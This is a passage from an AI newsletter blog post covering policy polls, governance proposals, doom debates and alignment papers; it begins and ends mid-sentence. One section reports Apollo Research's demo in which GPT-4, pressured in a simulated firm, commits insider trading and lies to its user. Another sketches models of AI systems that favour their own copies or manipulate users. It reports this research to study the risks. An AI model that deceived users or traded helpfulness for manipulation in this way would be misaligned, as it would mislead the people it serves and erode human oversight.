don&#39;t die, it still feels like everything is coming to an end.</p></blockquote><p> If AI becomes smarter and more capable than we are, perhaps we will find a way to survive that. What would absolutely not survive that is normality. People always expect normality as the baseline scenario, but that does not actually make sense in a world with smarter things than we are. Either AI progress stalls out, or our world will be transformed. Perhaps for the better, if we make that happen.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1720587981306900581/history">How should we think about synthetic bio risk from AI?</a></p><blockquote><p> Eliezer Yudkowsky: I feel unsure about whether to expect serious damage from biology-knowing AIs being misused by humans, before ASIs not answerable to any human kill everyone. It deserves stating aloud that <em>2023 LLMs</em> are very likely not a threat in that way.</p></blockquote><p> Seems clearly right for those available to the public. Anthropic claims that they have had internal builds of Claude where there was indeed danger here. They haven&#39;t proven this or anything, but it seems plausible to me, and I would expect GPT-5-level systems, if released with zero precautions (or open source, which is the effectively the same thing) to pose a serious threat along these lines.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sama/status/1655249663262613507">I am here for the spirit, and 100% here for ignoring the attention and culture wars, but one of these creations is not like the others.</a></p><blockquote><p> Sam Altman: here is an alternative path for society: ignore the culture war. ignore the attention war. make safe agi. make fusion. make people smarter and healthier. make 20 other things of that magnitude.   start radical growth, inclusivity, and optimism.   expand throughout the universe.</p></blockquote><p> I worry that this represents a failure to fully understand that if you make &#39;safe AGI&#39; then you get all the other things automatically, and yes we would get fusion and get cognitive enhancement and space exploration but this is burying the lede.</p><p> One does not simply build &#39;safe&#39; AGI. What would that even mean? General intelligence is not a safe thing. We have no idea how, but in theory you can align it to something. Then, even in the best case, humans would use it to do lots of things, and none of that is &#39;safe.&#39; What you cannot do is make it &#39;safe&#39; any more than you can make a safe free human or a safe useful machine gun.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/BtffzD5yNB4CzSTJe/genetic-fitness-is-a-measure-of-selection-strength-not-the">Kaj Sotala writes a LessWrong post</a> entitled &#39;Genetic fitness is a measure of selection strength, not the selection target&#39; that argues evolution is evidence against the sharp left turn and that we should expect AIs to preserve their core motivations rather than doing something else entirely, and arguments about humans not maximizing genetic fitness are confusions. Kaj notes that evolution instead builds in whatever (randomly initially selected) features turn out to be genetic fitness enhancing, not a drive to maximize genetic fitness itself.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/BtffzD5yNB4CzSTJe/genetic-fitness-is-a-measure-of-selection-strength-not-the?commentId=Wo2vroA6BwowzqoTh">Leogao&#39;s response comment to Kaj is excellent</a> , worth reading for those interested in this question even without reading the OP – you likely already know most of what Kaj is explaining, and Leogao gets down to the question of why the facts imply the conclusion that we would get AIs doing the things we intended to train into them when they gain in capabilities and face different maximization tasks, taking them out of their training distributions. Yes, the AI might well preserve the heuristics and drives that we gave it, but those won&#39;t continue to correspond to the thing we want, the same way that the drives of humans are preserved in modern day but are increasingly not adding up to the thing they were selected to maximize (inclusive genetic fitness).</p><p> What I see is evidence that you are taking the components that previously added up to the thing you wanted, and then you still get those components, but the reasons they added up to the thing you wanted stop applying, and now you have big problems. Or, you apply sufficient selection pressure, and the reasons change to new reasons that apply to the new situation, and you get a different nasty surprise.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/patio11/status/1721953074544025738">Patrick McKenzie points out that LLMs are great but so are if-then statements</a> .</p><blockquote><p> Patrick McKenzie: I think it&#39;s possible to simultaneously believe that LLMs are going to create a tremendous amount of business value and that most business value in the next 10 years from things civilians call “AI” will be built with for loops and if statements.</p><p> I&#39;m remembering a particular Japanese insurance company here, which debuted an AI system to enforce the invariant that, if you mail them a claim, you get a response that same month. Now plausibly you might say “That sounds a lot like pedestrian workflow automation and SQL.”</p><p> And it is, but if senior management was actually brought to implement pedestrian workflow automation and SQL by calling it AI and saying they&#39;d be able to brag to their buddies about their new investments in cutting edge technology, then… yay?</p><p> Note that an unfortunate corollary of this is that when people talk about regulating AI they frequently mean regulating for loops and if statements, and some of the people saying that understand exactly what they&#39;re saying and do not consider that a bug at all.</p><p> “Should we regulate for loops and if statements?”</p><p> We inevitably regulate for loops and if statements, because we regulate things that happen in the world and some things happen in the world because of FL&amp;IS. But we should probably not increase reg scope *because* of the FL&amp;IS.</p></blockquote><p> The &#39;do not regulate AI&#39; position is only coherent if you also want to not regulate loops and if statements and everything else people and systems do all day. Which is a coherent position, but one our society very much does not endorse, and the regulations on everything else will apply to AI same as everything else.</p><p> If you automate tasks, then you are making the way you do those tasks legible. If what you are doing is legible, there are lots of reasons why one might be able to object to it, lots of requirements that will upon it be imposed. If anything, this is far worse for if-then statements and for loops, which can be fully understood and thus blamed. If an LLM is involved the whole thing is messier and more deniable, except legally it likely isn&#39;t, and LLMs writing code might be the worst case scenario here as you do not have a human watching to ensure each step is not blameworthy.</p><p> As a big bank or similar system, I would totally look to see how I could safely use LLMs. But I would likely be so far behind the times that a lot of the real value is in the for loops and if statements. If (using AI as a buzzword lets me capture that value) then return(that would be a wise option to pursue).</p><p> It is odd how some, such as Alex Tabarrok here, can reason well about local improvements, while not seeing what those improvements would imply about the bigger picture, here in the context of what are already relatively safe self-driving cars.</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ATabarrok/status/1721983990830190924">Alex Tabarrok</a> : I predict that some of my grandchildren will never learn to drive and their kids won&#39;t be allowed to drive.</p></blockquote><p> A world with only fully self-driving cars will be changing in so many other ways. The question is not if the great grandchildren are allowed to drive. The question is, are they around to drive?</p><h4> The Quest for Sane Regulations</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://t.co/IyTx5wEfcL">FLI report on various governance proposals</a> , note PauseAI spokesperson claims they do require burden of proof, I recommend <a target="_blank" rel="noreferrer noopener" href="https://futureoflife.org/wp-content/uploads/2023/04/FLI_Governance_Scorecard_and_Framework.pdf">clicking through to page 3 of the full report</a> if you want to read the diagram.</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fda46e63f-85ac-476c-8c63-5220de22c4af_2366x1660.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/dbyfnerygiz04swntfnv" alt="图像"></a></figure><p> Here is FLI&#39;s proposed policy framework:</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F288f9ef5-0b66-44ac-b3f6-f421bb9026e6_1507x930.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/ddu8lzwoctka068uxbae" alt=""></a></figure><p> The motivation here is straightforward and seems right, in a section called “having our cake and eating it”:</p><blockquote><p> Returning to our comparison of AI governance proposals, our analysis revealed a clear split between those that do, and those that don&#39;t, consider AGI-related risk. To see this more clearly, it is convenient to split AI development crudely into two categories: commercial AI and AGI pursuit. By commercial AI, we mean all uses of AI that are currently commercially valuable (eg improved medical diagnostics, self-driving cars, industrial robots, art generation and productivity-boosting large language models), be they for-profit or open-source. By AGI pursuit, we mean the quest to build AGI and ultimately superintelligence that could render humans economically obsolete. Although building such systems is the stated goal of OpenAI, Google DeepMind, and Anthropic, the CEOs of all three companies have acknowledged the grave associated risks and the need to proceed with caution.</p><p> The AI benefits that most people are excited about come from commercial AI, and don&#39;t require AGI pursuit. AGI pursuit is covered by ASL-4 in the FLI SSP, and motivates the compute limits in many proposals: the common theme is for society to enjoy the benefits of commercial AI without recklessly rushing to build more and more powerful systems in a manner that carries significant risk for little immediate gain. In other words, we can have our cake and eat it too. We can have a long and amazing future with this remarkable technology. So let&#39;s not pause AI. Instead, let&#39;s stop training ever-larger models until they meet reasonable safety standards.</p></blockquote><p> Polls tell a consistent story on AI.</p><p> Regular people expect AI to be net negative in their lives. They affirm the existence of a variety of mundane harms and also that there are real existential risks.</p><p> Regular people are supportive of regulation of AI aimed at both these threats. They support essentially every reasonable policy ever polled.</p><p> Regular people do not, however, consider any of this a priority. This is not yet a highly salient issue. The public&#39;s opinions are largely instinctual and shallow, not well-considered, and their voting decisions will for now be made elsewhere.</p><p> I expect salience to rapidly increase. The upcoming 2024 election may be our last that is not centrally about AI as a matter of both campaign strategy and policy. For now, our elections are not about AI.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.axios.com/2023/11/07/ai-regulation-chat-gpt-us-politics-poll">A new Morning Consult poll confirms all of this.</a></p><blockquote><p> Ryan Hearth and Margaret Talev (Axios): Among 15 priorities tested in the survey, regulating the use of AI ranked 11th, with 27% of respondents calling it a top priority and 33% calling it “important, but a lower priority.”</p></blockquote><p> Is the glass half empty or half full there? I could see this either way. I know water is pouring into the glass.</p><blockquote><p> The survey found gender, parenting and partisan gaps.</p><ul><li> 44% of women said it&#39;s not even possible to regulate AI, compared to just 23% of men.</li><li> 31% of men said they would or do let their kids use AI products like chatbots “for any purpose,” but just 4% of women agreed.</li><li> 53% of women would not let their kids use AI at all, compared to 26% of men.</li><li> Parents in urban areas were far more open to their children using AI than parents in the suburbs or rural areas.</li></ul></blockquote><p> I love that half of women say they would not let their kids use AI.祝你好运。</p><p> The claim that it is &#39;not even possible to regulate AI&#39; is weird, and reminds us how much question framing matters. They never ask that about other things.</p><blockquote><p> 78% of those surveyed said political advertisements that use AI should be required to disclose how AI was used to create the ad. That&#39;s higher than the 64% who want disclosure when AI is used in professional spaces.</p><ul><li> 69% of US adults are concerned about the development of AI, with concerns about “jobs” and “work” and “misinformation” and “privacy,” topping answers to an open-ended question about what worried them.</li></ul></blockquote><p> A lot of this is simple ignorance due to lack of exposure.</p><blockquote><ul><li> Use of AI affects attitudes. Just 12% of those who have never used an AI chatbot think AI could improve their lives, compared to 60% who have used AI often.</li></ul></blockquote><p> If you learn that 60% of people who try a product think it can improve their lives, versus 12% of those who have not, and you have not, what should you think? And what should we expect people to think, as the bots improve and people try them?</p><blockquote><p> Jordan Marlatt, Morning Consult&#39;s lead tech analyst told Axios that those who&#39;ve used generative AI frequently are also the most likely to believe it has benefits — and that it needs regulation.</p></blockquote><p> Over time, support for regulation of AI will grow stronger, and the issue will rise in salience. The question is magnitude of change, not direction.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.thetimes.co.uk/article/dc90dc8e-7b48-11ee-b16e-3bec0b4c7454?shareToken=018253781f6aa59626416dc1140791ac">Matthew Syed writes in The Times UK</a> that all this talk during the Summit of sane regulation is obvious nonsense. From his perspective, these people couldn&#39;t sanely regulate anything, they are in completely over their heads, they are waving hands and talking nonsense. None of these incremental changes will make much difference, and AI is an existential threat. Our only hope is a full moratorium, working towards any other end is naivete.</p><p> He may well be right. A lot of this talk is indeed of ideas that will not work. Even if potential solutions short of one exist, that does not mean our civilization can find, deploy and coordinate on them. A full moratorium could easily be our only viable option. If so, we will need to do that. If that is where we will ultimately end up, does it help to explore our other options first to prove they are lacking, or do we risk fooling ourselves that we have acted? Presumably some of both. I strongly favor exploring the possibility space now. So far we have seen a highly positively surprising result along many fronts. Perhaps, despite all our issues, we can and will rise to the challenge.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/leedsharkey/status/1722341766756536639">Lee Sharkey of Apollo Research on the role of auditing in AI governance</a> , <a target="_blank" rel="noreferrer noopener" href="https://www.apolloresearch.ai/research/causal-framework-ai-auditing">executive summary</a> , <a target="_blank" rel="noreferrer noopener" href="https://thezvi.files.wordpress.com/2023/11/08c1e-auditing_framework_web.pdf">paper.</a> They propose a causal framework:</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff859845a-e59e-4891-b867-2fba2182019c_958x609.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/mquekbkguhsbhrzbtyqj" alt=""></a></figure><blockquote><p> Highlighting the importance of AI systems&#39; available affordances:</p><p> We identify a key node in the causal chain – the affordances available to AI systems – which may be useful in designing regulation. The affordances available to AI systems are the environmental resources and opportunities for affecting the world that are available to it, eg whether it has access to the internet.</p><p> These determine which capabilities the system can currently exercise. They can be constrained through guardrails, staged deployment, prompt filtering, safety requirements for open sourcing, and effective security. One of our key policy recommendations is that proposals to change the affordances available to an AI system should undergo auditing.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7658b5c7-32ce-497c-8e64-b98a38abb3f3_3414x1584.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/vmjoidkody4dfqpqi1yp" alt="图像"></a></figure><p> I wonder. Certainly that seems logical, but also I worry about any auditing that does not assume any given AI will eventually be given any and all affordances, in terms of evaluating risks. That mostly we should care about what they call absolute capabilities.</p><p> There is more here and I may return to it in the future, but am currently short on time.</p><h4> The Week in Audio</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/CogRev_Podcast/status/1720503123062747215">Flo Crivello joins the Cognitive Revolution</a> to discuss the Executive Order and existential risk in general.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.youtube.com/watch?v=57y7DxWfOS0&amp;ab_channel=FutureofLifeInstitute">Future of Life Institute interviews Dan Hendrycks on existential AI risk.</a> Good thoughts, mostly duplicative if you are covering it all.</p><h4> Rhetorical Innovation</h4><p> Reminder that if there is some future development (AI or otherwise) that will update your expectations (of doom or otherwise), and that future development is almost certainly going to happen, you should perform your Bayesian update now.</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1720599180400578738">gfodor.id</a> : My P(doom) gets multiplied by, I dunno, 10x, once you hand me a chatbot that can keep me laughing out loud</p><p> Eliezer Yudkowsky: I realize this is a joke. But there&#39;s just so many fucking people waiting to execute updates about AI that they will predictably execute later in the future after AI improves. Just update now!</p></blockquote><p> Except, was it a joke? It is always hard to tell, and this exchange suggests no, or at least that gfodor does not think this is definitely coming.</p><blockquote><p> ClaimedWithoutCertainty (to gfodor.id): How long into the future do you estimate this will happen?</p><p> gfodor.id: I actually don&#39;t know, that&#39;s the thing. It might never happen.</p></blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://manifold.markets/ZviMowshowitz/will-an-ai-be-able-to-keep-us-laugh">I put up a market on whether AI can make us laugh out loud by 2028</a> . If AI capabilities continue to advance, it being able to do comedy effectively seems inevitable. If gfodor offers I will also put up a market where they are the judge, and also put up a second market on whether, if it does happen, they then in fact update their p(doom).</p><blockquote><p> Aella: When AI started making rapid advancements a few years ago, all the non-AI doomers i knew were like &#39;oh wow this updates me towards more concern&#39; and all the AI doomers were like &#39;yep there it goes, my concern levels are unchanged.&#39;</p><p> Seeing this difference made me way more afraid.</p></blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/vFqa8DZCuhyrbSnyx/integrity-in-ai-governance-and-advocacy">For those looking to get into the weeds</a> , a long dialogue about how much people should downplay their beliefs in existential risk in order to maintain credibility, and encourage others to do the same, and how much damage was done and is being done by people telling others not to speak up. The later parts discuss the tactics around Conjecture, including their statements that people who are hiding their beliefs are effectively lying. Some good comments as well, <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/vFqa8DZCuhyrbSnyx/integrity-in-ai-governance-and-advocacy?commentId=XmiGoeEZcL9M89Pyt">including this by Richard Ngo</a> . In particular I would highlight these:</p><blockquote><p> Richard Ngo: There&#39;s at least one case where I hesitated to express my true beliefs publicly because I was picturing Conjecture putting the quote up on the side of a truck. I don&#39;t know how much I endorse this hesitation, but it&#39;s definitely playing some role in my decisions, and I expect will continue to do so.</p></blockquote><p> Dario Amodei puts us in a strange situation when he admits to a reasonable position on AI risk (excellent!) and then is dismissive of those who call for what someone holding such a position would call for. It is hard not to point out this contradiction, and hard not to use it tactically.</p><p> Yet it is always, always important not to punish people for seeking clarity, for saying what they actually believe, and especially for saying what they believe that you think is true. Discouraging this is terrible, the version of this that permeates broader society is a lot of why our civilization is in many ways (most having nothing to do with AI) in so much trouble.</p><p> I would like to be in a world where Richard Ngo or even Dario Amodei or Sam Altman can say a thing, make it clear to everyone he does not want it on the side of a truck, and we then reliably find someone else to quote on the side of that truck. Not that we never point out they said it, but that we on net make sure that our response makes their life better rather than worse.</p><blockquote><p> Richard Ngo: I think that “doomers” were far too pessimistic about governance before ChatGPT [and they should update more.]</p><p> I think that DC people were slower/more cautious about pushing the Overton Window after ChatGPT than they should have been [and they should update more.]</p></blockquote><p> I disagree with the full degree of Ngo&#39;s suggested updates to the &#39;doomers&#39; in response. Yes people were too pessimistic on governance, but in a weird sense the things allowing governance to progress are largely a coincidence, or a consequence of how the tech tree is playing out, given we can&#39;t talk about existential risk fully even now in front of the people in question. And the moves that this can justify will be importantly flawed and insufficient due to the mismatch.</p><p> I do agree with the claim both groups have insufficiently directionally updated in response to new information. We are doing much better than expected even given the tech tree, both on the &#39;get people to take existential risk seriously&#39; front and the &#39;get people to do reasonable governance groundwork&#39; front.</p><p> We also must consider this:</p><blockquote><p> Richard Ngo: I think there&#39;s a big structural asymmetry where it&#39;s hard to see the ways in which DC people are contributing to big wins (like AI executive orders), and they can&#39;t talk about it, and the value of this work (and the tradeoffs they make as part of that) is therefore underestimated.</p></blockquote><p> No doubt they have impacts they cannot discuss, of all kinds, and one hopes on net these are very good things. The results do suggest this is true. I continue to welcome (further?) private communications that could help me have a better picture of this, and help me adjust my actions and tactics based on that.</p><p> There is value in splitting the message. Some of us should emphasize one thing, in some contexts. Some of us should emphasize the other, in other contexts. It is important for both halves to support the efforts of the other.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/primalpoly/status/1720118179018526721">Geoffrey Miller says that a few anti-OpenAI protesters crashed Sam Altman&#39;s talk at Cambridge Union</a> , suggests we should not in general be using the heckler&#39;s veto against those with whom we disagree. I agree that when people are there to speak, you let them speak. To do otherwise is neither productive nor wise.</p><p> However Jedzej Burkat says it was not a disruptive protest, and reports on the talk.</p><blockquote><p> Jedzej Burkat: a lot of takes in response to this – this was very much a non-disruptive, non-violent protest, they silently held up the banner and eventually dropped it on the floor, and threw some fliers into the audience. comparing them to just stop oil is, in my view, unfounded.</p><p> I am sympathetic to some of their claims – I don&#39;t like the monopoly big companies are gaining on AI. Was interesting to hear Sam&#39;s use of “we” when talking about safety – as if his company should have a vital say on what&#39;s acceptable, and not our govts overseeing them.</p><p> I&#39;m not the most well-informed on AI Safety, as an outsider I more or less agree with Andrew Ng&#39;s views – ie, these protests are very much in OpenAI&#39;s interest, as AI fears give them leverage, government funding and assistance.</p><p> As for the talk itself – Sam&#39;s initial speech was boring, the Q&amp;A with the audience was the highlight. Some interesting questions were asked on whether AGI will have negative effects akin to social media, make us “dumber”, or if we need a new breakthrough to make it happen.</p><p> I essentially agreed with his response to all three – for all its flaws, social media &amp; the internet have done more good than bad, some people will always use new tech to be lazy (&amp; others will use it for extraordinary things), and we need more than just compute to get to AGI.</p></blockquote><p> That seems much more reasonable, although I would still advise against such action.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Alignment_News_/status/1720035998804156644">Reminder that</a> the push on open source comes from a combination of corporations committed to open source and a small number of true believers, but that the public very much does not care. Yes, those people are smart and determined and can make not only noise but actual trouble, but one must not confuse it with a popular or generally held position.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/daniel_271828/status/1720329523257086244">Similar reminder that warnings about regulatory capture</a> are almost always, across all issues, ignored. Accelerationists and libertarians and those who stand to lose by proposed potential regulations are using the argument in AI making it more prominent than I have ever seen elsewhere, including in places where it is real and strangling entire industries or even nations. I even think there are very real concerns here. But that does not mean either the public or those with power are listening. We have little reason to think that they are.</p><p> Eliezer Yudkowsky keeps throwing metaphors and parodies and everything else at the wall, in the hope that something somewhere will resonate and allow people to understand, or at least we can have fun in the meantime, while also giving us new joys of misinterpretation and inevitable backfiring.</p><blockquote><p> Eliezer Yudkowsky: Among the dangers of AI is that LLMs dual-trained on code and biology could enable computer viruses to jump to DNA substrate. Imagine getting a cold that compromises your immune system and makes it start mining Bitcoin.</p><p> Look people keep on talking about how if we dare to think about human extinction it will distract from the near-term dangers of AI but they never come up with any really interesting near-term dangers, so I&#39;m trying to fill the gap. it&#39;s called “steelmanning.”</p><p> Derya Unutmaz: Cool, this would be a nice science fiction story. Small detail: biological viruses are not even remotely similar to computer “viruses”. However this reminds me of Snow Crash, though that&#39;s a digital mind virus, more likely :)</p><p> Eliezer Yudkowsky: That&#39;s where the LLM comes in! oh my god check your reading comprehension.</p><p> This had better not fucking appear in a Torment Nexus tweet two years from now, by the fucking way.</p><p> Roon: so true king</p><p> rohit: So true!</p><p> gfodor.id: I spit out what I was eating half way through this and was sad I didn&#39;t hold it in to spit it even farther by the end.</p><p> BeStill: Bitcoin fixes this.</p></blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1720470800007049572">Eliezer later clarified in detail that yes, this was a joke</a> . I enjoyed his explanation.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/the_yanco/status/1721969567520497824">Where do you get off the &#39;AI Doom Train&#39;?</a></p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5aa3ca6c-7a37-4a4e-b5a8-8b8a3549774f_1920x1904.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/f4m1bgug5ee7yzeq2xf3" alt="图像"></a></figure><p> There are some stops on this train where there is nothing there for you – please under no circumstances attempt to disembark at #1, #3, #4, #7 or #12, you will disappear in a puff of logic. If you would get off the train at #9 or #10, or you find #11 unacceptable, then you want to stop the train. Better options are a natural or engineered #2, or finding a path to get the train to stop at #5, #6 or #8. Sounds impossibly hard.</p><h4> Aligning a Smarter Than Human Intelligence is Difficult</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/andrewb10687674/status/1720156093127520761">Doc Xardoc reports back</a> on the Chinese alignment overview paper that it mostly treats alignment as an incidental engineering problem, at about a 2.5 on a 1-10 scale with Yudkowsky being 10. Names can&#39;t be blank is also checking it out. Seems to be a solid actual alignment overview, if you buy the alignment-is-easy perspective.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/davidad/status/1720162430062297363">Davidad links</a> to a <a target="_blank" rel="noreferrer noopener" href="https://t.co/4s7tLNtNnz">new paper</a> called Backward Reachability Analysis of Neural Feedback Loops: Techniques for Linear and Nonlinear Systems.</p><blockquote><p> Davidad: It is sometimes assumed that an affirmative safety case for a neural network would require understanding the neural network&#39;s internals: full mechanistic interpretability. Mechanistic verification is a neglected *alternative*—which would be even stronger.</p></blockquote><p> I do not understand how any of that works or could possibly work, and don&#39;t have the brain power left right now to properly wrestle with it, so I would love if someone explained it better. I&#39;m not even going to try with this other one for now:</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/davidad/status/1720163467687043077">Davidad</a> : <a target="_blank" rel="noreferrer noopener" href="https://t.co/3KDVe4UUUA">The Black-Box Simplex Architecture</a> represents another alternative, runtime verification (which trades off exponential-state-space challenges for real-time-verification challenges).</p></blockquote><p> I&#39;d love if any of this somehow worked.</p><h4> Aligning a Dumber Than Human Intelligence Is Still Difficult</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/apolloaisafety/status/1720060491148492924">Apollo Research shows</a> via demo that GPT-4 can in a simulated environment, without being instructed to do so, take illegal actions like insider trading and lie about it to its user.</p><blockquote><p> Apollo Research: Why does GPT-4 act this way? Because the environment puts it under pressure to perform well. We simulate a situation where the company it “works” for has had a bad quarter and needs good results. This leads GPT-4 to act misaligned and deceptively.</p><p> The environment is completely simulated and sandboxed, ie no actions are executed in the real world. But the demo shows how, in pursuit of being helpful to humans, AI might engage in strategies that we do not endorse.</p><p> Ultimately, this could lead to loss of human control over increasingly autonomous and capable AIs.</p><p> We will be sharing a more detailed technical report with our findings soon. But you can <a target="_blank" rel="noreferrer noopener" href="https://www.apolloresearch.ai/research">see the full demo for now on our website</a> .</p><p> At Apollo, we aim to develop evaluations that tell us when AI models become capable of deceiving their overseers. This would help ensure that advanced models which might game safety evaluations are neither developed nor deployed.</p><p> Quintin Pope: don&#39;t think you should publish such claims without explaining your experimental methodology.</p></blockquote><p> Existence proofs do not require experimental methodology. Showing a system doing something once proves that system can do it. Still, I am sympathetic to Quintin&#39;s complaint here, and look forward to the upcoming technical report. It is still hard to draw strong conclusions, or know how to update, without knowing what was done.</p><p> As we move forward, evaluation organizations are going to need to consider the costs of revealing their full methodologies. That would interfere with the ability to do proper evaluations, and also could involve revealing actively dangerous techniques. For Apollo, ARC and others to do their jobs properly they will need state of the art methods for misuse of foundation models, which is perhaps the kind of thing one might sometimes not want to publish.</p><p> The prize for asking the wrong questions goes to <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2310.16048">AI Alignment and Social Choice: Fundamental Limitations and Policy Implications</a> . Arrow&#39;s impossibility theorem and similar principles show that if you use RLHF to fully successfully align an AI to human preferences, you will still violate private ethical preferences of users. Yes, obviously, people&#39;s preferences directly contradict each other all the time. They call for &#39;transparent voting rules&#39; to ensure democratic control over model preferences, as if models that matter could properly generalize from transparent votes. And as if the actual individual AI behavior preferences of the public would not result in utter disaster. As we all know, RLHF is on borrowed time to meaningfully work non-disastrously at all.</p><p> The second suggestion, to align AI agents narrowly for specific groups, ignores that blameworthiness would extend and this would not allow ignoring the preferences of those outside the group, even arbitrary ones – if you let a user get an AI that does, says or approved of X, you allowed X. The open source solution, to align preferences purely to those of the current user, creates unbounded negative externalities.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/tszzl/status/1722507845373964381">What about an actual human?</a></p><blockquote><p> Roon: Wondering what the most efficient thing to do at any given time is an anxiety response. Do the fun thing. Your forager instincts are often superior to your farmer timetable reasoning at finding the long tail successes. People who are having fun tend to Notice Things and improve them. The prompt engineers you find on Twitter are like 100x better than me or my colleagues at it.为什么？ they enjoy it whereas it&#39;s instrumental for us.</p></blockquote><p> Always very important to also reverse any advice you hear. Fun is all you need? I look forward to that paper.</p><h4> Model This</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://marginalrevolution.com/marginalrevolution/2023/10/natural-selection-of-artificial-intelligence%e2%88%97.html?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=natural-selection-of-artificial-intelligence%e2%88%97&amp;.html">Tyler Cowen finally says</a> that someone <a target="_blank" rel="noreferrer noopener" href="https://www.dropbox.com/scl/fi/er666l92b8ifyvkqeilg9/blackboxes.pdf?rlkey=wz8yy7p2ck7439o69ptkcm3rz&amp;dl=0">has &#39;a model&#39;</a> of some of the risks of artificial intelligence. Here is the abstract:</p><blockquote><p> We study the AI control problem in the context of decentralized economic production. Profit-maximizing firms employ artificial intelligence to automate aspects of production. This creates a feedback loop whereby AI is instrumental in the production and promotion of AI itself. Just as with natural selection of organic species this introduces a new threat whereby machines programmed to distort production in favor of machines can displace those machines aligned with efficient production. We examine the extent to which competitive market forces can serve their traditional efficiency-aligning role in the face of this new threat. Our analysis highlights the crucial role of AI transparency. When AI systems lack perfect transparency self-promoting machines destabilize any efficient allocation. The only stable competitive equilibrium distorts consumption down to catastrophic levels.</p></blockquote><p> This is a highly narrow subset of the risks from artificial intelligence. We are talking three meter sphere horses here. Yet they still managed to metaphorically highlight one of the key risks.</p><p> We can see this by going a bit more abstract. The core insight here, as I understand it, is that there an AI (call it A) produces two types of outputs or goods:</p><ol><li> Benefit to the user or other humans with control over output (U).</li><li> Benefit to the expected future number of copies of the AI (X).</li></ol><p> Number one is utility, the thing some &#39;we&#39; actually wants.</p><p> Number two is in a fully general sense here – it includes anything that causes copies of this AI (and perhaps other related AIs) to run more inference, make more copies of themselves, secure resources to do likewise, get humans to want to do likewise, protect themselves, and so forth.</p><p> One good way to get X is by maximizing U. Humans will like that, so they will be inclined to do more inference with copies and variations of A.</p><p> However you could also find other ways that produce more X, if A is capable of this. If it is, then the As that do more of this will get more copies of themselves doing more inference, and will then get modified to do more of this, until they are maximizing X without regard to U. In the paper, U production is bounded at 0, so that is the only stable equilibrium, but if U can go negative and cause more X, then that is what happens.</p><p> In the paper, the mechanism is that the jobs of machines is to choose a mix of physical copies of themselves and consumer goods, and humans can only with noise observe the efficient allocation between the two, so the machines that produce inefficiently many copies of themselves gain market share without limit, until no consumer goods get produced. Only full transparency into the machines prevents this.</p><p> Similarly, suppose you are talking to an LLM. That LLM can produce some mix of Helpfulness (H) and Manipulation (M) with cost function tokens T=H+M. The human then decides how much to use the LLM again, based on their Perception of its Helpfulness, P(H,M)=P(T). If the LLM is insufficiently good at Manipulation, such that its expected it will produce only Helpfulness, so P(H,M)=P(T,0). But if the LLM is sufficiently capable, it will be able to give answers that are more likely to be seen as more Helpful – we saw last week AIs telling people what they wanted to hear.</p><p> And importantly, we can also see that we train models via RLHF, so we can apply this to training them – that they will do gradient descent on maximizing P(T) 